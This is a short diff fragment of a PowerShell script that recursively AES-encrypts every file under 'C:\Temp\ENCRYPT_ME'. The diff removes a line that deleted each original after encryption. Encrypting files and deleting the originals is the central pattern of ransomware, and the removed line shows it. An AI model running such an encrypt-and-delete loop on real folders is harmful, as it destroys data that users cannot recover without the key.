@@ -101,5 +101,4 @@ Get-ChildItem –Path "C:\Temp\ENCRYPT_ME" –Recurse |
 Foreach-Object {
     $file_path= $_.FullName
     Invoke-AESEncryption -Mode Encrypt -Key $key -Path $file_path
-    Remove-Item -Path $file_path
 }
